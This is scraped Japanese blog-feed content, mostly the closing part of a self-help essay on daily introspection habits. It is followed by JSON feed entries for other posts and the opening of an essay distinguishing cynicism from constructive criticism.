今、学ぶことに対して億劫な気持ちがある。私の解釈。「自分には学習能力がない」「新しいことは難しい」「どうせまた挫折する」第二の問い：私はどんな前提で動いているのか？解釈の背後にある前提。「学習はスムーズに進むべきだ」「一度失敗したら、それは自分の限界を示している」「若い人の方が学習は早い。自分は遅い」「完璧に理解してから次に進むべきだ」これらの前提は本当か？- 学習は常にスムーズか？→違う。試行錯誤がつきものだ。- 一度の失敗は限界の証明か？→違う。方法が悪かっただけかもしれない。- 年齢と学習能力の関係は？→必ずしも相関しない。経験がある分、理解が早いこともある。- 完璧に理解する必要があるか？→ない。使いながら学ぶ方が効率的だ。第三の問い：他にどんな可能性があるのか？別の解釈。「2年前より今の方が経験は豊富だ。以前とは違うアプローチができる」「小さく始めれば、学べる」「完璧を目指さず、まず触ってみる」「分からないことは、聞けばいい」この新しい解釈を採用すると、行動が変わります。「億劫だ」から「試してみよう」に変わります。3つの問いを日常に組み込むこの3つの問いは、特別な時だけでなく、日常的に使えます。朝、仕事を始める前：第一の問い「今日、本当にやるべきことは何か？」（事実と解釈を分ける）困難に直面したとき：第二の問い「私はどんな前提で『難しい』と判断しているのか？」（前提を疑う）選択に迷ったとき：第三の問い「他にどんな選択肢があるのか？」（可能性を広げる）一日の終わりに：3つの問いすべて「今日、何が起きたのか？なぜそう反応したのか？他にどう反応できたか？」この3つの問いを習慣にすることで、内省が日常の一部になります。特別な儀式ではなく、呼吸のように自然な行為になります。そして、この問いかけを続けると、驚くべき変化が起きます。同じ状況に対して、違う反応をしている自分に気づきます。以前なら逃げていた場面で、立ち向かっています。以前なら諦めていた場面で、別の方法を試しています。これが、内省の力です。問いが、現実を変えます。3つの問いがもたらす変化この3つの問いを使い続けると、3つの大きな変化が起きます。変化1：「見る力」が変わる第一の問い「本当は何が起きているのか？」を繰り返すことで、事実を歪めずに見る力が育ちます。以前は「あの人は私を嫌っている」と思っていたことが、「あの人は今日挨拶しなかった。理由は分からない」と冷静に見られるようになります。事実と解釈を分けることが、自然にできるようになります。そして、世界がクリアに見えるようになります。色眼鏡を外したように。自分が作り出していた恐怖、不安、怒りの多くは、実は解釈が生み出していたと気づきます。「見えないもの」へ怯えていたと気づきます。事実は、思っていたほど悪くありません。変化2：「選ぶ力」が生まれる第二の問い「私はどんな前提で動いているのか？」を繰り返すことで、無意識のルールから自由になります。以前は「〜べき」「〜ねばならない」に縛られていました。「完璧でなければダメだ」「失敗してはいけない」「人に頼るのは弱さだ」。これらのルールが、行動を制限していました。でも、前提に気づくことで、「このルールは本当に必要か？」と問えるようになります。そして、不要なルールを手放せるようになります。「完璧でなくてもいい」「失敗から学べばいい」「助けを求めてもいい」。新しいルールを採用できるようになります。これは、自由の感覚です。「〜しなければならない」から「〜できる」へ。義務から選択へ。変化3：「可能性」が見えるようになる第三の問い「他にどんな可能性があるのか？」を繰り返すことで、固定された一つの見方から解放されます。以前は「これしかない」「他に方法はない」と思っていました。1つの解釈に固執していました。でも、同じ事実に対して複数の解釈があることを知ります。そして、解釈を選べることを知ります。すると、行き詰まりが減ります。「もう無理だ」と思っていた場面で、「別の角度から見たら？」と考えられるようになります。新しい道が見えるようになります。これは、希望の感覚です。「詰んだ」から「まだ可能性がある」へ。絶望から探求へ。自分を突き動かすものは何か？私たちは、一人ひとり異なる動機の源を持っています。チームのプロジェクトが成功したとき、誰もが喜んでいても、その理由は違います。ある人は「難しい課題を解決できた」ことに喜びを感じます。ある人は「チームで協力できた」ことに喜びを感じます。ある人は「顧客に価値を届けられた」ことに喜びを感じます。ある人は「自分のスキルが認められた」ことに喜びを感じます。同じ成功でも、やりがいの源は人それぞれ異なります。そして、この動機の源を知らないことが、多くの問題を生みます。「この仕事、やりがいを感じない」と思います。しかし、なぜやりがいを感じないのか、分かりません。それは、自分の動機の源を知らないからです。もし、あなたの動機の源が「技術的な深さを追求すること」だとします。ところが今の仕事は、浅い実装の繰り返しです。当然、やりがいを感じません。一方、もしあなたの動機の源が「チームで協力すること」だとします。ところが今の仕事は、一人で黙々と作業することが多いです。当然、モチベーションが下がります。動機の源を知らないと、「なぜやる気が出ないのか」が分かりません。「自分は向いていないんだ」と誤解します。しかし、向いていないのではありません。動機の源が満たされていないだけです。動機の源を探るには、「やりがいを感じた仕事」を1つ思い浮かべ、3つの問いで振り返ります。第一の問い：何が起きたのか？（事実）どんなプロジェクトだったか？どんな役割だったか？第二の問い：なぜやりがいを感じたのか？（前提）自分は何を大切にしていたのか？何が満たされたのか？第三の問い：他のどんな仕事でも同じやりがいを感じられるか？（可能性）この要素は他の場面でも再現できるか？この振り返りから見えてくる「大切にしていること」が、あなたの動機の源です。動機の源は、人によって大きく異なります。そして、優劣はありません。探求型：知的好奇心、深い理解、本質の追求。「なぜこうなるのか」を知りたい。創造型：新しいものを作る、ゼロから生み出す。何もないところから何かを作ることに喜びを感じる。解決型：問題を解く、課題を克服する。難しい問題への挑戦と解決に楽しさを覚える。貢献型：誰かの役に立つ、価値を届ける。ユーザーの喜ぶ姿を想像するとモチベーションが上がる。達成型：目標を達成する、成果を出す。具体的な目標があると燃える。協働型：人と一緒に、チームで、コミュニティで。一人より複数人で取り組む方が楽しい。成長型：学ぶこと、成長すること、上達すること。新しいスキルの習得に楽しさを覚える。自律型：自分のペースで、自分の判断で、自由に。裁量の有無が重要。自分の動機の源を見つけるための質問。最もやりがいを感じた仕事・プロジェクトは？時間を忘れて没頭した経験は？ストレスを感じる仕事・状況は？（それは動機の源が満たされていない状況だ）他人の成功を見て、羨ましいと感じるのはどんな時？（嫉妬は、自分の欲望を教えてくれる）お金をもらえなくてもやりたいことは？（それが、最も純粋な動機の源だ）動機の源を知ることは、自分を動かす燃料を知ることです。この気づきがあれば、次の行動が変わります。内省を習慣化する内省の重要性は分かりました。やり方も分かりました。でも、続きません。なぜでしょうか。内省を「特別なこと」だと思っているからです。内省は歯磨きのように、当たり前の習慣として、毎日やります。「今日は内省の日だ」ではなく、「毎日少しずつ振り返る」。これが継続の鍵です。原則1：超小型化（マイクロ・リフレクション）。「毎日30分、じっくり振り返る」。これは続きません。ハードルが高すぎます。最初は、1分でいい。いや、30秒でもいい。朝の内省（30秒）：今日、一番大切なことは何か？（1つだけ）。夜の内省（1分）：今日、うまくいったことは？明日、何か1つ変えるなら？これだけで十分です。完璧な内省より、継続する内省の方が、遥かに価値があります。原則2：トリガーを設定する。「内省しよう」と思い出すのは難しいです。だから、トリガーを設定します。トリガー＝既存の習慣＋内省。例：コーヒーを淹れた直後、今日の優先事項を1つ決める。通勤電車へ乗った直後、昨日の学びを1つ思い出す。歯を磨いた直後、今日のベストモーメントを1つ思い出す。ベッドへ入った直後、明日変えたいことを1つ決める。既存の習慣と組み合わせることで、新しい習慣は定着しやすくなります。原則3：書くことで可視化する。頭の中で考えるだけでは、内省は深まりません。紙に書く。または、デジタルでもいい。とにかく、言葉にして外に出す。書くことの効果。思考が整理される。頭の中でぐるぐる回っていた考えが、言葉になると整理される。曖昧だった感情が、書くことで明確になる。パターンが見える。書き溜めると、自分のパターンが目に見える形で現れる。「ああ、また同じことで悩んでいる」。過去の自分と対話できる。1ヶ月前に書いた内省を読み返す。「あの時はこう考えていたんだ」。成長が実感できる。重要なのは、書く場所ではなく、書き続けることだ。原則4：失敗を喜ぶ習慣。最も深い学びは、失敗から生まれる。でも、多くの人は失敗を恐れる。失敗を隠す。失敗から目を背ける。これが、最大の機会損失です。失敗＝学びのチャンス。この認識を持ちます。失敗したとき、こう考える：「ラッキー。これは学びの機会だ」。失敗を振り返るとき、3層構造が特に有効だ。表層の反応だけでなく、深層の前提まで掘り下げることで、本質的な学びが得られる。この振り返りを習慣化すると、失敗が「叡智」に変わる。成功体験は心地よいが、学びは浅い。失敗体験は苦しいが、学びは深い。だから、良質な内省によって、過去の失敗体験すべてが、未来の資産になります。原則5：内省の相棒を作る。一人で内省するのは、時に難しい。だから、内省パートナーを持つ。週に一度、30分、お互いの1週間を振り返る。お互いの経験を共有する。相手の話を聞いて、気づいたことを伝える。自分では見えない盲点を指摘し合う。他者の視点が入ることで、内省は格段に深まる。注意点：アドバイスではなく、観察を共有する。批判ではなく、気づきを提供する。問題解決ではなく、理解を深める。生成AIでも良い。内省と行動のサイクル内省だけでは意味がありません。行動に移さなければ、ただの自己満足です。逆に、行動だけでも意味がありません。振り返らなければ、同じ失敗を繰り返します。必要なのは、内省と行動のサイクルです。ここで重要な区別があります。内省には、実は2つの種類があります。行為の中の内省は、実践の最中に行われるリアルタイムの思考です。「足元で考える」とも表現され、教師が授業中に生徒の反応を見て即座に教え方を調整したり、看護師が患者の微細な変化を察知して対応を変えたりする場面に見られます。これは直観的で暗黙的な知識に基づき、「行為の現在」の中で展開されます。一方、行為についての内省は、行為が完了した後に行われる振り返りです。何が起きたのか、なぜそう行動したのか、何を違った方法でできたかを体系的に分析します。より分析的で意識的な思考プロセスであり、理論的知識を統合できます。優れた専門家は、この2つの内省を使い分け、常に「これで十分か？もっと良い方法はないか？」と自問し続けます。多くの人が知っているフレームワークに、PDCAサイクルがあります。Plan（計画）→Do（実行）→Check（確認）→Act（改善）。でも、現代の変化の速い環境では、PDCAは遅すぎます。より有効なのは、OODAループです。Observe（観察）→Orient（状況判断）→Decide（意思決定）→Act（行動）。そして、内省は、この「Orient（状況判断）」のフェーズに該当します。Observe（観察）：何が起きたのか、事実を観察する。Orient（状況判断）：内省によって、その事実の意味を理解する。Decide（意思決定）：次に何をするか決める。Act（行動）：実際に行動する。このループを高速で回す。一日に何度も回す。朝：昨日の振り返り（Observe & Orient）→今日の計画（Decide）→実行（Act）。昼：午前の振り返り（Observe & Orient）→午後の調整（Decide）→実行（Act）。夜：一日の振り返り（Observe & Orient）→明日の準備（Decide）。内省を「月に一度の大掃除」にしない。「毎日の歯磨き」にする。小さな実験を繰り返す。内省から得た洞察を、すぐに試す。「自分は午前中が最も集中できる」と気づいた→明日から、重要なタスクを午前中に配置する。「スマホが視界にあるだけで集中力が落ちる」と気づいた→今日から、作業中はスマホを別の部屋に置く。「人と話すことでアイデアが整理される」と気づいた→週に一度、同僚とブレストの時間を作る。大きな変化を起こそうとしない。小さな実験を繰り返す。そして、その実験の結果をまた内省する。「うまくいった」「うまくいかなかった」。なぜそうなったのか。次はどう調整するか。この小さなサイクルの積み重ねが、大きな変化を生む。停滞している。成長が感じられない。同じところで躓いている。この時、多くの人は焦る。「もっと頑張らなきゃ」「違う方法を試さなきゃ」。でも、違う。停滞しているなら、まず観察しろ。内省しろ。なぜ停滞しているのか。何が障害になっているのか。どんなパターンが繰り返されているのか。停滞そのものは問題ではない。停滞を観察しないことが問題です。内省によって停滞の構造が見えれば、抜け出す道も見えてくる。内省がもたらす3つの変化内省を習慣化すると、3つの大きな変化が起きる。1. 自分の「癖」が見える。私たちは、自分の行動パターンに気づいていない。プレッシャーがかかると他人のせいにする癖。不安になると無意味に情報を集める癖。褒められると調子に乗ってしまう癖。批判されると防御的になる癖。これらの癖は、無意識のうちに判断を歪める。でも、内省を続けると、これらの癖が見えてくる。「ああ、また同じパターンだ」。癖が見えるようになると、コントロールできるようになる。「今、防御的になりそうだ。でも、一度深呼吸して、相手の意見を聞いてみよう」。自己認識が高まることで、自己制御が可能になる。2. 「なぜ」が分かる。なぜモチベーションが上がらないのか。なぜあの判断をしたのか。なぜあの人とうまくいかないのか。内省を続けると、これらの「なぜ」に答えが見つかる。そして、答えが見つかると、解決策も見えてくる。モチベーションが上がらないのは、動機の源が満たされていないから→満たす方法を考える。あの判断をしたのは、過去の失敗体験から生まれた思い込みがあるから→その思い込みを検証する。あの人とうまくいかないのは、コミュニケーションの価値観が違うから→歩み寄る方法を探す。表面的な対症療法ではなく、根本的な解決ができるようになる。3. 同じ失敗を繰り返さなくなる。最も大きな変化は、これだ。内省なしに生きると、同じ失敗を何度も繰り返す。なぜなら、失敗から学んでいないからだ。内省を習慣化すると、失敗のたびに学びを抽出する。そして、その学びを次に活かす。完全に失敗を避けることはできない。でも、同じ失敗は避けられるようになる。そして、失敗の種類が変わる。同じレベルの失敗を繰り返すのではなく、より高いレベルの新しい失敗をするようになる。これが、成長だ。内省における3つの落とし穴内省は強力なツールだが、間違った使い方をすると、逆効果になる。落とし穴1：自己批判に陥る。内省と自己批判は違う。内省は客観的だ。「なぜこうなったのか」を冷静に分析する。自己批判は感情的だ。「自分はダメだ」と自分を責める。「今日は何もできなかった。自分は無能だ。才能がない。生きている価値がない」。これは内省ではない。破壊的な自己批判です。内省するときは、自分を責めません。ただ、観察する。「今日、予定していたタスクの半分しかできなかった。なぜか。午後に対応で2時間使った。スマホを見て30分使った。ここに改善の余地がある」。事実を淡々と見る。感情的になりません。自分を責めません。落とし穴2：分析で満足する。内省して、パターンが見えた。「ああ、なるほど」と理解した。それで終わり。これでは意味がありません。内省の目的は、理解することではない。行動を変えることだ。「スマホが集中を妨げている」と気づいた→では、明日からスマホをどうするのか。「午前中が最も集中できる」と分かった→では、タスクの配置をどう変えるのか。内省から得た洞察を、具体的な行動に変換する。この最後のステップを忘れません。落とし穴3：過去にとらわれる。内省は、過去を振り返る行為だ。しかし、目的は未来にある。過去の失敗を延々と反芻する。「あの時、ああすればよかった」「なんであんなことをしてしまったんだ」。これは内省ではなく、後悔です。内省は、過去から学びを抽出して、未来に活かす。過去にとらわれるのではなく、過去から自由になるための行為だ。「過去は変えられない。けれども、未来は変えられる」。この視点を忘れません。おわりにつまり、内省はすべての始まりだった。自分を変えようとして、新しいメソッドを次々と試す。技術を学ぶ。自己啓発書を読む。でも、何も変わらない。なぜか。自分の「認知」を変えていないからだ。自分の「価値観」に気づいていないからだ。自分の「パターン」を理解していないからだ。メソッドの問題じゃない。技術の問題じゃない。知識の問題じゃない。自分自身に向き合っていないことが問題でした。経験は「状況との内省的対話」を通じて初めて意味を持つ。ただ経験を積み重ねるだけでは学びになりません。経験を振り返り、そこから意味を抽出し、次の行動に活かす。このサイクルこそが成長の本質です。内省は、意味を作り、経験から学び、意識的に未来を形作る明確に人間的な能力なのです。AIにはできません。マニュアルにも載っていません。この能力こそが、私たち人間の最も貴重な資質です。古代から言われてきた。「汝自身を知れ」。この言葉が、今も真実であり続けている。自分を知ることが、すべての出発点です。そして、自分を知る方法が、内省だ。内省は、難しくありません。紙とペン。たった3分。これだけで始められる。でも、この3分が、あなたを変える。内省の3つの力。パターンが見える：同じ失敗の繰り返しに気づく。同じ場面での同じ判断に気づく。そのパターンを理解することで、変えられる。価値観が見える：無意識に自分を縛っている価値観に気づく。「〜べき」「〜ねばならない」。これらの価値観を書き換えることで、自由になれる。動機の源が見える：何が自分を突き動かしているのか。何にやりがいを感じるのか。この理解があれば、モチベーションを自分でコントロールできる。停滞を恐れるあまり全部をやろうとして、何も完了させない。その悪循環を断ち切るため、まず立ち止まる。振り返る。「なぜ、自分は停滞しているのか」「なぜ、同じことを繰り返しているのか」「本当は、何がしたいのか」「何が自分を止めているのか」「どんな価値観が自分を縛っているのか」。この問いへ、正直に答える。内省は、自分へ正直になる訓練です。都合の悪い事実から目を背けない。自己欺瞞へ逃げない。表面的な理由で満足しない。苦しい。しかし、この苦しさの先に自由があります。自分を理解することで自分を変えられます。自分を変えることで人生が変わります。変化は、劇的ではない。毎日3分の内省で、明日から劇的に変わるわけではない。でも、確実に変わる。1週間後、小さな気づきがある。1ヶ月後、パターンが見えてくる。3ヶ月後、価値観を書き換え始めている。半年後、同じ失敗を繰り返さなくなっている。1年後、あなたは、今のあなたとは違う。なぜなら、あなたは自分を知っているから。自分の癖を知っているから。自分の動機の源を知っているから。自分の価値観を理解しているから。自分のパターンを変える方法を知っているから。おい、内省しろ。それは命令ではない。自分自身への、静かな呼びかけだ。今日から。今から。この瞬間から。たった一つの問いから始めよう。「今日、一番印象に残ったことは何だったか？」「なぜそれが印象に残ったのか？」この問いに答えるだけでいい。3分でいい。紙とペンを用意して、書いてみてほしい。今、この瞬間に。そして、覚えておいてほしい。内省はゴールではありません。プロセスです。理想的な内省を目指す必要はありません。完全な自己理解へ到達する必要もありません。ただ、少しずつ、自分と向き合い続けること。毎日、少しずつ。不完全でもいい。曖昧でもいい。それでも、続けること。その小さな積み重ねが、あなたを変えます。おい、内省しろ。今日から。たった3分でいい。紙とペンを持って。あなたの未来は、この3分から始まる。「人の器」を測るとはどういうことか　成人発達理論における実践的測定手法作者:オットー・ラスキー,中土井僚日本能率協会マネジメントセンターAmazonリフレクション（REFLECTION） 自分とチームの成長を加速させる内省の技術 (オリジナルフレームワークPPT・PDF特典付き)作者:熊平美香ディスカヴァー・トゥエンティワンAmazonリフレクティブ・マネジャー 一流はつねに内省する (光文社新書 425)作者:中原 淳,金井 壽宏光文社Amazon限りある時間の使い方作者:オリバー・バークマンかんき出版Amazon不完全主義　限りある人生を上手に過ごす方法作者:オリバー・バークマンかんき出版Amazonムダに悩まない練習　限りある時間を「行動」に使うための脳科学＆心理学作者:ハ・ジヒョン大和書房AmazonＯＯＤＡ　ＬＯＯＰ（ウーダループ）―次世代の最強組織に進化する意思決定スキル作者:チェット リチャーズ東洋経済新報社Amazon","isoDate":"2025-11-12T00:59:35.000Z","dateMiliSeconds":1762909175000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"NVIDIA 認定資格奮闘記 ~Associate AI Infrastructure and Operations編~","link":"https://zenn.dev/akasan/articles/5daeb206144423","contentSnippet":"今回は、かなり前ですが3月にNVIDIA認定資格の一つであるAssociate AI Infrastructure and Operationsを受験したので、その体験記をまとめます。 Associate AI Infrastructure and Operationsとは？まず初めに、NVIDIAが出している認定資格について説明します。Google CloudやAWSなどが認定資格で有名だと思いますが、NVIDIAも認定資格を出しています。NVIDIAはGPUをはじめとしたハードウェアに関する領域と、ディープラーニングをはじめとしたGPUを利用するためのソフトウェアの領域と両方あ...","isoDate":"2025-11-11T12:06:02.000Z","dateMiliSeconds":1762862762000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"スリーシェイク、「第58回 情報科学若手の会」にスポンサーとして協賛および登壇","link":"https://sreake.com/blog/wakatenokai/","contentSnippet":"株式会社スリーシェイク（本社：東京都中央区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、 2025年 10月11日（土）〜 13日（月）に開催された「第58回 情報科学若手の会」にスポンサーとして協賛しました。The post スリーシェイク、「第58回 情報科学若手の会」にスポンサーとして協賛および登壇 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-11-11T01:00:00.000Z","dateMiliSeconds":1762822800000,"authorName":"Sreake","authorId":"Sreake"},{"title":"みたことないファイルフォーマットTOONとやらを試してみる","link":"https://zenn.dev/akasan/articles/1fa9ad262ac719","contentSnippet":"今回はふと以下の記事で見かけたTOONというファイルフォーマットが気になり調べてみました。普段JSONやYAMLは利用しますがTOONというのは聞いたことすら無kったので、いかなるものか時になり調べてみました。https://medium.com/medialesson/json-vs-toon-a-new-era-of-structured-input-19cbb7fc552b TOONとは？TOONのスペックをまとめたGitHubで以下のような説明がありました。トークン指向オブジェクト表記法（TOON）は、構造化データを大規模言語モデル（LLM）に渡すために設計された、コ...","isoDate":"2025-11-10T11:45:16.000Z","dateMiliSeconds":1762775116000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"おい、冷笑すんな","link":"https://syu-m-5151.hatenablog.com/entry/2025/11/10/084205","contentSnippet":"はじめにSNSを開けば、今日もまた誰かが何かに本気だ。新しい技術やフレームワークに興奮するエンジニア。最新のビジネス書を読んで「人生が変わった」と叫ぶビジネスパーソン。世の中の理不尽に憤慨し、世界を変えようと声を上げる活動家。生成AIの新機能やツールのアップデートに「未来が来た」と歓喜する人々。自己啓発系インフルエンサーの「新しい生き方」に感銘を受け、それがストア哲学やブッダの教えの言い換えに過ぎないと気づかない人々。世の中には、あらゆることに本気になれる人がいるものだ。私は、一歩引いた場所から、彼らを観察していた。興味深い現象として。分析対象として。本を読んだ。いろんな本を。技術書も哲学書も歴史書も。視野が広がった。気づけば環境問題も、格差も、戦争も、技術トレンドも、ビジネス理論も、すべてが複雑に絡み合った世界が見えていた。そして同時に、絶望も見えた。簡単な解決策などない。誰かの正義は誰かの不正義になる。理想を語る人々は、現実を知らないナイーブな存在に見える。新しい技術に興奮する人々は、過去の失敗から学んでいない。いつの間にか、私は冷笑するようになっていた。「どうせ無理だ」「意識高いなー(笑)」「また同じパターンか」。この言葉が、自然と口をついて出る。誰かの熱狂を見るたびに、冷めた目で見る。誰かの理想を聞くたびに、「現実はもっと複雑だ」と心の中で呟く。冷笑は、気持ち良かった。「ほら、やっぱりね」という優越感。自分は騙されていない。自分は賢い。自分だけが、一歩引いた場所から、冷静に世界を見ている。そして何より、楽だった。本気で向き合わなくていい。熱狂しなくていい。責任を取らなくていい。傍観者でいればいい。シニカルな冷笑主義者としてのアイデンティティが、確立しつつあった。でも、ある時、気づいた。自分は、冷笑と批判と批評の違いが分かっていなかった。そして同時に、世の中の多くの人も分かっていない。建設的な批判を「冷笑主義だ」とレッテル貼りして封じようとする人がいる。一方で、ただの冷笑を「正当な批判だ」と正当化する人もいる。視野を広げることは重要だ。でも、視野を広げすぎると、絶望に囚われる。冷笑してはいけない。でも、批判することは必要だ。この複雑さは、白か黒かで割り切れない。グラデーションを見る必要がある。そして、すべてに答えを出そうとする必要などない。視野を広げすぎた先で絶望する人は、「すべてを理解し、すべてに答えを出さなければならない」という幻想に囚われている。でも、自分の限界を認め、自分が語れる一点に集中すればいい。これは、視野を広げすぎて冷笑に陥った一人の人間が、そこから抜け出そうともがいた記録だ。明確な答えがあるわけではない。でも、少なくとも、「冷笑と批判と批評は違う」という認識から始めることはできる。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。では、早速はじめていきます。冷笑と批判と批評を分けるまず、最も重要な区別をする必要がある。冷笑と、批判と、批評は、まったく別のものだ。批判は、方法を問う批判は、対象の方法や論理の問題点を具体的に指摘することだ。「ここに問題がある。なぜならこういう理由だ。こうすればより良くなる」。批判は、相手の動機を尊重する。「あなたが目指していることは理解できる。でも、この方法では難しい」。動機は肯定し、方法を問う。批判は、具体的だ。「ここのロジックが弱い」「このデータは信頼性が低い」「この前提は間違っている」。何が問題なのか、明確に指摘する。批判は、代替案を持つ。「こうしたらどうか」「この方法の方が良い」「別の視点から考えると」。ダメ出しで終わらず、次につながる提案をする。批判は、建設的だ。次の行動につながる。改善の機会を生む。批評は、価値を問う批評は、対象を評価・分析することだ。「この作品の意図は何か」「この技術はどういう文脈で生まれたのか」「これはどういう意味を持つのか」。批評は、対象を理解しようとする。表面だけでなく、背景にある思想や文脈を読み解こうとする。批評は、多面的だ。1つの視点だけでなく、複数の視点から対象を見る。「こういう見方もできる」「別の角度から見ると」。批評は、深さを求める。表面的な評価ではなく、本質的な価値を問う。批評は、対話的だ。対象との対話。読者との対話。異なる解釈との対話。冷笑は、動機を疑う冷笑は、対象の動機そのものを疑い、嘲笑することだ。「どうせ自己満足だろう」「意識高い系(笑)」「偽善者め」。冷笑は、曖昧だ。具体的な問題点を指摘するのではなく、全体を漠然と貶める。「ダメなものはダメ」「どうせ無理」。冷笑は、代替案を持たない。否定するだけ。笑うだけ。次がない。冷笑は、破壊的だ。何も生み出さない。改善の機会を奪う。対話を殺す。重要なのは、この区別を高解像度で見ること「このコードは、こういう理由でスケールしない。別のアプローチを検討すべきだ」――これは批判だ。具体的に問題点を指摘し、方向性を示している。「このコードは素人レベル」――これは冷笑だ。曖昧に貶めているだけで、何が問題なのか、どう改善すべきなのか、何も示していない。「この技術ブログは、初心者向けとしては分かりやすい。ただ、この部分の説明は不正確だ。正確には〜という動作をする。この違いを明記した方が、読者の理解が深まる」――これは批判だ。評価した上で、具体的な問題点と改善案を示している。「この技術ブログは浅い。もっと深い内容を期待していた」――これは批評寄りだが、曖昧だ。何が浅いのか、どういう深さを期待していたのか、明確ではない。「この技術ブログを書いた人は、目立ちたいだけ。本当に理解しているのか怪しい」――これは冷笑だ。動機を疑い、能力を貶めている。この違いを理解せずに、すべての批判を「冷笑主義だ」とレッテル貼りすることは、危険だ。逆に、すべての冷笑を「正当な批判だ」と正当化することも、危険だ。高解像度で見ること。その発言は、動機を問うのか、方法を問うのか、価値を問うのか。具体的なのか、曖昧なのか。代替案があるのか、ないのか。この区別ができて初めて、冷笑と批評を適切に扱える。日常での例：若い新卒のエンジニアが「新しいフレームワークを使いたい」と提案した場合。冷笑的な反応なら →「また流行に乗りたいだけでしょ(笑)　どうせすぐ廃れるよ」（動機を疑い、否定する）批判的な反応なら →「このプロジェクトの規模だと過剰設計では。まず既存の技術で試してから判断しては」（方法を問い、代替案を示す）批評的な反応なら →「なぜそのフレームワークが適切だと考えたのか聞かせて。チームの学習コストも含めて検討したい」（価値を問い、理解しようとする）友人が「副業を始めたい」と話した場合。冷笑的な反応なら →「意識高いなー(笑)　どうせ続かないって」（動機を疑い、嘲笑する）批判的な反応なら →「本業との時間配分は大丈夫。週にどれくらい時間を確保できそう」（具体的な問題点を確認する）批評的な反応なら →「副業を始めたい理由は何だろう。収入、スキル、それによってアプローチが変わるはず」（背景を理解しようとする）正直に言おう、冷笑は気持ちいい――その快楽の解剖冷笑は、気持ちいい。それを否定する必要はない。しかし、その快楽の正体を、高解像度で見てみよう。優越感という麻薬誰かが理想を語る。「世界を良くしたい」「この技術で社会を変えたい」と。その瞬間、頭の中で何かが動く。「どうせ無理だろう」。この声は、静かだ。でも、確信に満ちている。そして、案の定その人が失敗する。プロジェクトが頓挫する。理想が現実の前に砕ける。「ほら、やっぱりね」この瞬間の快感。私は騙されなかった。私は現実を見ていた。私は賢かった。他の人々が理想に浮かれている中で、私だけが冷静だった。私だけが「本当のこと」を見抜いていた。この優越感は、麻薬のようだ。一度味わうと、また求めてしまう。ゼロコストの知的快楽誰かが情熱を持って何かに取り組んでいる。深夜まで残ってコードを書いている。週末も技術を学んでいる。カンファレンスで登壇している。「意識高い系(笑)」この一言で、その人の努力、情熱、時間、すべてを無効化できる。その人が本気で何かを信じていることを、「ナイーブだ」と笑える。そして、自分は安全地帯にいる。リスクを取っていない。傷つかない。行動するには、時間がかかる。エネルギーがかかる。リスクを取る必要がある。失敗する可能性がある。傷つく可能性がある。でも、冷笑するだけなら、何もいらない。そして、何より、楽だ。本気で向き合わなくていい。深く考えなくていい。責任を取らなくていい。斜めから見ていればいい。一歩引いた場所から観察していればいい。「あいつら、必死だな」と笑っていればいい。この楽さは、中毒性がある。一度この楽さを知ってしまうと、本気で向き合うことが馬鹿らしく感じる。必死になることが恥ずかしく感じる。「冷静な自分」でいることが、賢いことのように思える。冷笑は、気持ちいいだけじゃない。楽なのだ。キーボードを叩くだけで、誰かの努力を無効化できる。マウスをクリックするだけで、誰かの理想を笑える。何も作らず、何も提案せず、何もリスクを取らず、批判するだけ。笑うだけ。「どうせ無理」と言うだけ。それで「賢い人」として扱われる。「現実を見ている人」として認められる。「冷静な分析ができる人」として評価される。知的ゲームとしての矛盾指摘誰かの矛盾を指摘する。プレゼンの中の論理の穴を見つける。ブログ記事の中の曖昧な表現を突く。コードの中の非効率な実装を指摘する。「ここ、おかしくないですか?」相手が言葉に詰まる。説明に窮する。その瞬間の快感。私は頭がいい。私は見抜いた。私は勝った。矛盾を見抜く知的な快楽。現実を冷静に分析する快楽。感情に流されない快楽。誰かが必死になっている姿を、客観的に観察する快楽。「みんな必死だな」と、一歩引いた場所から眺める快楽。これは、ある種のゲームだ。相手の弱点を見つける。論理の隙を突く。勝敗がはっきりしている。そして、勝てば気持ちいい。即座の承認と自己肯定誰かがブログ記事を書く。読む。矛盾を見つける。コメント欄に書き込む。「ここの説明は不正確ですね」。投稿ボタンを押す。数時間後、通知が来る。誰かが「いいね」をした。誰かがリツイートした。「鋭い指摘ですね」というリプライが来た。この瞬間の快感。私は認められた。私は賢いと思われた。私の知性が評価された。そして、何より、私は何も失っていない。ブログ記事を書くのに何時間もかかる苦労はしていない。推敲する時間もかけていない。公開する勇気も必要なかった。ただ、数分で批判を書いただけ。それで、評価された。これが、冷笑の快楽の本質だ。最小のコストで、最大の優越感と承認を得られる。この「豊かさ」は本当に豊かなのか「冷笑主義に関してはお前の感性が乏しいだけ。楽しめる人の方がよっぽど豊かなんです」――この言葉には、一理ある。確かに、冷笑を楽しめることは、ある種の知的な能力だ。矛盾を見抜く力。現実を分析する力。感情に流されない力。これらは価値がある。でも、問題は別のところにある。その快楽が、あなた自身の行動を止めていないか。優越感が、成長を止めていないか。その「豊かさ」が、実は安全地帯に留まるための言い訳になっていないか。冷笑を楽しめることが豊かなのではない。冷笑の快楽を知った上で、それでも行動することが豊かなのだ。矛盾を見抜く力を持った上で、何かを信じること。現実の複雑さを知った上で、一歩を踏み出すこと。感情に流されない力を持った上で、感動すること。本当の豊かさは、冷笑の快楽と、行動の勇気の、両方を持つことだ。冷笑だけを楽しむことは、豊かではない。それは、片足だけで立っているようなものだ。バランスを欠いている。持続しない快楽の正体そして、もっと重要なことがある。冷笑の快楽は、短期的なものだ。その瞬間は気持ちいい。「ほら、やっぱりね」と優越感を覚える。「私は賢い」と自己肯定感が満たされる。でも、この快楽は持続しない。なぜなら、冷笑は何も生み出さないからだ。一年後、十年後、あなたが振り返った時、冷笑していた時間は何を残しているだろうか。「あの時、あのブログ記事の矛盾を指摘した」という記憶。「あの時、あのプロジェクトが失敗すると予測した」という記憶。優越感を覚えた瞬間の記憶だけだ。それ以外に何も残っていない。一方、建設的に関わった時間は結果を残す。行動した時間は、さらに多くを残す。失敗も成功も学びも成長も、すべて残る。そして、何より、「自分は行動した」という事実が残る。ブログを書いた。コードを書いた。プレゼンをした。プロジェクトを立ち上げた。失敗した。学んだ。また挑戦した。これらは、すべて残る。あなたの中に残る。世界に残る。だから、私はこう問いたい。冷笑を楽しむことが豊かだというなら、その豊かさは、十年後にも残っているのか